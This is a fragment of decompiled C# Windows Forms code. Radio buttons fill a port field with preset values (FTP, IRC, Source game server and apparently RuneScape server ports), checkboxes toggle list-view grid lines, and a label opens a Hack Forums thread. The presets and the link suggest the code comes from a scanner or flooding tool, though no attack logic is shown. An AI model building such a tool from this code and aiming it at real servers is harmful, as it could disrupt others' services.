			((TextBox)TextBoxX_13).set_Text("21");
		}
		if (!RadioButton3.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("");
		}
	}

	private void vDonobce4(object sender, EventArgs e)
	{
		if (RadioButton4.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("27015");
		}
		if (!RadioButton4.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("");
		}
	}

	private void RadioButton5_CheckedChanged(object sender, EventArgs e)
	{
		if (RadioButton5.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("6667");
		}
		if (!RadioButton5.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("");
		}
	}

	private void RadioButton6_CheckedChanged(object sender, EventArgs e)
	{
		if (RadioButton6.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("43594");
		}
		if (!RadioButton6.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("");
		}
	}

	private void RadioButton7_CheckedChanged(object sender, EventArgs e)
	{
		if (RadioButton7.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("43595");
		}
		if (!RadioButton7.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("");
		}
	}

	private void CheckBoxX_1_CheckedChanged(object sender, EventArgs e)
	{
		if (CheckBoxX_1.get_Checked())
		{
			ListView3.set_GridLines(true);
		}
		if (!CheckBoxX_1.get_Checked())
		{
			ListView3.set_GridLines(false);
		}
	}

	private void CheckBoxX_0_CheckedChanged(object sender, EventArgs e)
	{
		if (CheckBoxX_0.get_Checked())
		{
			ListView4.set_GridLines(true);
		}
		if (!CheckBoxX_0.get_Checked())
		{
			ListView4.set_GridLines(false);
		}
	}

	private void CheckBoxX_2_CheckedChanged(object sender, EventArgs e)
	{
		if (CheckBoxX_2.get_Checked())
		{
			ListView5.set_GridLines(true);
		}
		if (!CheckBoxX_2.get_Checked())
		{
			ListView5.set_GridLines(false);
		}
	}

	private void TextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void LabelX19_Click(object sender, EventArgs e)
	{
		Process.Start("http://www.hackforums.net/showthread.php?tid=962179");
	}

	internal static void smethod_1(Control control_0, bool bool_0)
	{
		control_0.set_DoubleBuffered(bool_0);
	}
}
